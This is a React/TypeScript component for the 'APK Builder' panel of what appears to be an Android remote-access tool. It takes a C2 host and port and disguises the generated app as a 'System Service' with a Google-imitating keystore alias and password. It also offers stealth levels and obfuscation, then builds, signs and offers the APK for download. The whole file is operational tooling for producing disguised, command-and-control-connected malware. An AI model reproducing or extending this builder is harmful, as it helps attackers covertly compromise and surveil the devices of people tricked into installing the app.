import React, { useState, useEffect } from 'react';
import { apk as apkApi } from '../services/api';
import { useStore } from '../store/useStore';
import type { ApkBuildConfig } from '../types';

const DEFAULT_CONFIG: ApkBuildConfig = {
  serverHost: window.location.hostname,
  serverPort: 3001,
  appName: 'Serviço de Sistema',
  packageName: 'com.system.service',
  disguiseLabel: 'Otimização de interface e energia',
  keystoreAlias: 'google-services-key',
  keystorePassword: 'GooglePlayServices2024',
  signingMode: 'release',
  obfuscate: true,
  stealthLevel: 2,
};

export const APKBuilder: React.FC = () => {
  const [config, setConfig] = useState<ApkBuildConfig>(DEFAULT_CONFIG);
  const buildStatus = useStore((s) => s.buildStatus);
  const setBuildStatus = useStore((s) => s.setBuildStatus);
  const addToast = useStore((s) => s.addToast);
  const [polling, setPolling] = useState(false);
  const [jobId, setJobId] = useState<string | null>(null);

  const set = <K extends keyof ApkBuildConfig>(key: K, val: ApkBuildConfig[K]) =>
    setConfig((prev) => ({ ...prev, [key]: val }));

  const startBuild = async () => {
    try {
      const { jobId: id } = await apkApi.build(config);
      setJobId(id);
      setBuildStatus({ jobId: id, stage: 'queued', progress: 0, log: [] });
      setPolling(true);
    } catch (e) {
      addToast({ type: 'error', message: `Build failed: ${(e as Error).message}` });
    }
  };

  // poll build status
  useEffect(() => {
    if (!polling || !jobId) return;
    const interval = setInterval(async () => {
      try {
        const { status } = await apkApi.status(jobId);
        setBuildStatus(status as never);
        const s = (status as { stage: string }).stage;
        if (s === 'done' || s === 'error') {
          setPolling(false);
          clearInterval(interval);
        }
      } catch {
        setPolling(false);
        clearInterval(interval);
      }
    }, 1500);
    return () => clearInterval(interval);
  }, [polling, jobId, setBuildStatus]);

  const stageColor = (stage: string) => {
    switch (stage) {
      case 'done': return 'text-green-400';
      case 'error': return 'text-red-400';
      case 'building': case 'signing': return 'text-cyan-400';
      default: return 'text-slate-400';
    }
  };

  return (
    <div className="h-full overflow-y-auto p-4 space-y-4" style={{ fontFamily: 'var(--font-mono)' }}>
      <h2 className="text-sm font-semibold text-white/80 tracking-widest uppercase">APK Builder</h2>

      {/* Config grid */}
      <div className="grid grid-cols-2 gap-3">
        {(
          [
            { key: 'serverHost' as const, label: 'C2 Host', type: 'text' },
            { key: 'serverPort' as const, label: 'C2 Port', type: 'number' },
            { key: 'appName' as const, label: 'App Name', type: 'text' },
            { key: 'packageName' as const, label: 'Package', type: 'text' },
            { key: 'disguiseLabel' as const, label: 'Disguise Label', type: 'text' },
            { key: 'keystoreAlias' as const, label: 'Keystore Alias', type: 'text' },
            { key: 'keystorePassword' as const, label: 'Keystore Pass', type: 'password' },
          ] as const
        ).map(({ key, label, type }) => (
          <div key={key} className="flex flex-col gap-1 col-span-1">
            <label className="text-[10px] text-white/30 uppercase tracking-wider">{label}</label>
            <input
              type={type}
              value={String(config[key])}
              onChange={(e) =>
                set(key, (type === 'number' ? Number(e.target.value) : e.target.value) as never)
              }
              className="bg-slate-900 border border-slate-700 rounded px-2.5 py-1.5 text-xs text-white/80 outline-none focus:border-cyan-600 transition-colors"
            />
          </div>
        ))}

        {/* Signing mode */}
        <div className="flex flex-col gap-1">
          <label className="text-[10px] text-white/30 uppercase tracking-wider">Signing Mode</label>
          <select
            value={config.signingMode}
            onChange={(e) => set('signingMode', e.target.value as 'debug' | 'release')}
            className="bg-slate-900 border border-slate-700 rounded px-2.5 py-1.5 text-xs text-white/80 outline-none focus:border-cyan-600"
          >
            <option value="release">Release (uber-apk-signer)</option>
            <option value="debug">Debug</option>
          </select>
        </div>

        {/* Stealth level */}
        <div className="flex flex-col gap-1">
          <label className="text-[10px] text-white/30 uppercase tracking-wider">Stealth Level</label>
          <select
            value={config.stealthLevel}
            onChange={(e) => set('stealthLevel', Number(e.target.value) as 1 | 2 | 3)}
            className="bg-slate-900 border border-slate-700 rounded px-2.5 py-1.5 text-xs text-white/80 outline-none focus:border-cyan-600"
          >
            <option value={1}>1 — Low</option>
            <option value={2}>2 — Medium</option>
            <option value={3}>3 — High</option>
          </select>
        </div>
      </div>

      {/* Checkboxes */}
      <div className="flex items-center gap-4">
        <label className="flex items-center gap-2 cursor-pointer">
          <input
            type="checkbox"
            checked={config.obfuscate}
            onChange={(e) => set('obfuscate', e.target.checked)}
            className="accent-cyan-500"
          />
          <span className="text-xs text-white/60">Obfuscate (ProGuard)</span>
        </label>
      </div>

      {/* Build button */}
      <button
        onClick={startBuild}
        disabled={polling}
        className="w-full py-2.5 rounded bg-cyan-700 hover:bg-cyan-600 text-white text-sm font-mono tracking-widest transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
      >
        {polling ? 'BUILDING...' : 'BUILD APK'}
      </button>

      {/* Status panel */}
      {buildStatus && (
        <div className="rounded border border-slate-700 bg-slate-900/50 p-3 space-y-2">
          <div className="flex items-center justify-between">
            <span className={`text-xs font-mono uppercase ${stageColor(buildStatus.stage)}`}>
              {buildStatus.stage}
            </span>
            <span className="text-xs text-white/30">{buildStatus.jobId.slice(-8)}</span>
          </div>

          {/* Progress bar */}
          <div className="w-full h-1 bg-slate-800 rounded-full overflow-hidden">
            <div
              className="h-full bg-cyan-500 transition-all duration-500 rounded-full"
              style={{ width: `${buildStatus.progress}%` }}
            />
          </div>

          {/* Log */}
          <div className="max-h-48 overflow-y-auto space-y-0.5">
            {buildStatus.log.map((line, i) => (
              <p key={i} className="text-[10px] font-mono text-white/50 leading-relaxed">{line}</p>
            ))}
          </div>

          {/* Download */}
          {buildStatus.stage === 'done' && buildStatus.downloadUrl && (
            <a
              href={apkApi.download(buildStatus.jobId)}
              download="output.apk"
              className="block w-full text-center py-2 rounded bg-green-700 hover:bg-green-600 text-white text-xs font-mono transition-colors mt-2"
            >
              DOWNLOAD APK
            </a>
          )}

          {buildStatus.stage === 'error' && (
            <p className="text-xs text-red-400 font-mono mt-1">{buildStatus.error}</p>
          )}
        </div>
      )}
    </div>
  );
};
